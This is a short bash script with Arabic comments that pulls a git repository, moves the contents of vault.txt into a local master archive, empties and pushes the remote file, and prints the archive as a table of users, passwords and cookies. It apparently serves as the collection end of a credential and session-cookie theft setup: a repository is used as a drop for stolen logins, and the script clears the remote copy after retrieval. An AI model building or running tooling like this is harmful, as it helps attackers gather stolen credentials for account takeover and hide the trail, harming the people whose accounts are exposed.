#!/bin/bash
# نظام تفريغ البيانات السحابي - Cyber Vault

echo "[*] Syncing with Cloud Storage..."
git pull origin main --quiet

if [ -s "vault.txt" ]; then
    # نقل البيانات للأرشيف المحلي وتفريغ السحاب
    cat vault.txt >> master_archive.txt
    echo -n "" > vault.txt
    git add vault.txt
    git commit -m "Dump & Clear" --quiet
    git push origin main --quiet
    echo "[✓] Data Dumped to local archive and Cloud Cleared."
else
    echo "[!] No new data in cloud."
fi

# عرض الجدول الاحترافي
clear
echo "======================================================================"
echo "          OFFLINE MASTER ARCHIVE (USER | PASS | COOKIE)               "
echo "======================================================================"
printf "%-18s | %-15s | %-15s | %-s\n" "TIME" "USER" "PASS" "COOKIE"
echo "----------------------------------------------------------------------"
column -t -s "|" master_archive.txt

